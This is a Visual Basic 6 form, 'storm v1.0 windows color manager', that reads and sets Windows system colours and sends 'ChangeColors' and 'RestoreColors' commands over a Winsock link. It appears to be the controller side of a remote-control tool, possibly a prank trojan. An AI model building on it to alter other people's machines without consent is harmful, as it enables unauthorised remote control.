VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmColor 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "storm v1.0"
   ClientHeight    =   4620
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4335
   LinkTopic       =   "Form1"
   ScaleHeight     =   4620
   ScaleWidth      =   4335
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   3720
      Top             =   1920
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Label lbloldappworkspace 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   3480
      TabIndex        =   18
      Top             =   4200
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Label lbloldinactivebordercolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   3000
      TabIndex        =   17
      Top             =   4200
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Label lbloldactivebordercolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   2520
      TabIndex        =   16
      Top             =   4200
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Label lbloldwinframecolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   2040
      TabIndex        =   15
      Top             =   4200
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Label lbloldbackground 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   1560
      TabIndex        =   14
      Top             =   4200
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Label lbloldwincolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   1080
      TabIndex        =   13
      Top             =   4200
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Label lbloldbuttoncolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   600
      TabIndex        =   12
      Top             =   4200
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Label lbloldmenucolor 
      BackColor       =   &H00808080&
      Height          =   375
      Left            =   120
      TabIndex        =   11
      Top             =   4200
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Label lblrestorecolors 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      Caption         =   "restore default colors"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   240
      Left            =   1110
      TabIndex        =   10
      Top             =   3750
      Width           =   2085
   End
   Begin VB.Shape Shape5 
      BorderColor     =   &H00FF8080&
      Height          =   300
      Left            =   1080
      Top             =   3720
      Width           =   2145
   End
   Begin VB.Label lblchangecolors 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      Caption         =   "change colors"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   240
      Left            =   2430
      TabIndex        =   9
      Top             =   3150
      Width           =   1365
   End
   Begin VB.Shape Shape4 
      BorderColor     =   &H00FF8080&
      Height          =   300
      Left            =   2400
      Top             =   3120
      Width           =   1425
   End
   Begin VB.Label lbltestcolors 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      Caption         =   "test colors"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   240
      Left            =   510
      TabIndex        =   8
      Top             =   3150
      Width           =   1365
   End
   Begin VB.Shape Shape11 
      BorderColor     =   &H00FF8080&
      Height          =   300
      Left            =   480
      Top             =   3120
      Width           =   1425
   End
   Begin VB.Label lblwindowcolor 
      BackColor       =   &H00FF0000&
      Height          =   405
      Left            =   160
      TabIndex        =   7
      Top             =   2320
      Width           =   525
   End
   Begin VB.Label lblfacecolor 
      BackColor       =   &H0000FFFF&
      Height          =   405
      Left            =   160
      TabIndex        =   6
      Top             =   1480
      Width           =   525
   End
   Begin VB.Label lblmenucolor 
      BackColor       =   &H000000FF&
      Height          =   405
      Left            =   160
      TabIndex        =   5
      Top             =   640
      Width           =   525
   End
   Begin VB.Label Label3 
      BackColor       =   &H00000000&
      Caption         =   "window color [window background]"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   840
      TabIndex        =   4
      Top             =   2400
      Width           =   3375
   End
   Begin VB.Label Label1 
      BackColor       =   &H00000000&
      Caption         =   "3d face color [task bar, buttons]"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   840
      TabIndex        =   3
      Top             =   1560
      Width           =   3375
   End
   Begin VB.Shape Shape3 
      BorderColor     =   &H00FF8080&
      Height          =   495
      Left            =   120
      Top             =   600
      Width           =   615
   End
   Begin VB.Label Label2 
      BackColor       =   &H00000000&
      Caption         =   "menu color [start menu, other menus]"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   840
      TabIndex        =   2
      Top             =   720
      Width           =   3375
   End
   Begin VB.Shape Shape2 
      BorderColor     =   &H00FF8080&
      Height          =   495
      Left            =   120
      Top             =   2280
      Width           =   615
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00FF8080&
      Height          =   495
      Left            =   120
      Top             =   1440
      Width           =   615
   End
   Begin VB.Label cmdX 
      Alignment       =   2  'Center
      BackColor       =   &H00FF8080&
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "OCR A Extended"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   4080
      TabIndex        =   0
      ToolTipText     =   "Close"
      Top             =   15
      Width           =   240
   End
   Begin VB.Label title 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "windows color manager"
      BeginProperty Font 
         Name            =   "OCR A Extended"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   0
      TabIndex        =   1
      Top             =   0
      Width           =   4335
   End
End
Attribute VB_Name = "frmColor"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim FirstX, FirstY As Integer

Private Sub Form_Load()
Dim lngColor As Long
lngColor = GetSysColor(4)
lbloldmenucolor.BackColor = lngColor
lngColor = GetSysColor(15)
lbloldbuttoncolor.BackColor = lngColor
lngColor = GetSysColor(5)
lbloldwincolor.BackColor = lngColor
lngColor = GetSysColor(1)
lbloldbackground.BackColor = lngColor
lngColor = GetSysColor(6)
lbloldwinframecolor.BackColor = lngColor
lngColor = GetSysColor(10)
lbloldactivebordercolor.BackColor = lngColor
lngColor = GetSysColor(11)
lbloldinactivebordercolor.BackColor = lngColor
lngColor = GetSysColor(12)
lbloldappworkspace.BackColor = lngColor
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbltestcolors.BackColor = &H8
lblchangecolors.BackColor = &H8
lblrestorecolors.BackColor = &H8
End Sub

Private Sub lblchangecolors_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
frmMain.tmrright.Enabled = True
frmMain.WS.SendData "ChangeColors;" & lblmenucolor.BackColor & ";" & lblfacecolor.BackColor & ";" & lblwindowcolor.BackColor
frmMain.Status.Caption = "changing system colors..."
End If
End Sub

Private Sub lblfacecolor_Click()
Call Choose4
End Sub

Private Sub lblmenucolor_Click()
Call Choose3
End Sub

Private Sub lblrestorecolors_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
frmMain.tmrright.Enabled = True
frmMain.WS.SendData "RestoreColors"
frmMain.Status.Caption = "restoring system colors..."
End If
End Sub

Private Sub lbltestcolors_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbltestcolors.BackColor = &HFFC0C0
End Sub

Private Sub lbltestcolors_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblrestorecolors.BackColor = &H8
lblchangecolors.BackColor = &H8
lbltestcolors.BackColor = &H800000
End Sub

Private Sub lblchangecolors_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblchangecolors.BackColor = &HFFC0C0
End Sub

Private Sub lblchangecolors_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblrestorecolors.BackColor = &H8
lbltestcolors.BackColor = &H8
lblchangecolors.BackColor = &H800000
End Sub

Private Sub lblrestorecolors_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblrestorecolors.BackColor = &HFFC0C0
End Sub

Private Sub lblrestorecolors_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblchangecolors.BackColor = &H8
lbltestcolors.BackColor = &H8
lblrestorecolors.BackColor = &H800000
End Sub

Private Sub lbltestcolors_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
a = SetSysColors(1, 4, lblmenucolor.BackColor)
a = SetSysColors(1, 15, lblfacecolor.BackColor)
a = SetSysColors(1, 5, lblwindowcolor.BackColor)
a = SetSysColors(1, 1, lblwindowcolor.BackColor)
a = SetSysColors(1, 6, lblwindowcolor.BackColor)
a = SetSysColors(1, 10, lblwindowcolor.BackColor)
a = SetSysColors(1, 11, lblwindowcolor.BackColor)
a = SetSysColors(1, 12, lblwindowcolor.BackColor)
Load frmColorMsg
frmColorMsg.Show
End Sub

Private Sub lblwindowcolor_Click()
Call Choose5
End Sub

Private Sub title_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = vbLeftButton Then
    FirstX = X
    FirstY = Y
End If
End Sub

Private Sub title_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = vbLeftButton Then
    Me.Left = Me.Left + (X - FirstX)
    Me.Top = Me.Top + (Y - FirstY)
End If
cmdX.BackColor = &HFF8080
End Sub

Private Sub cmdX_Click()
Unload Me
End Sub

Private Sub cmdX_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdX.ForeColor = &HC00000
End Sub
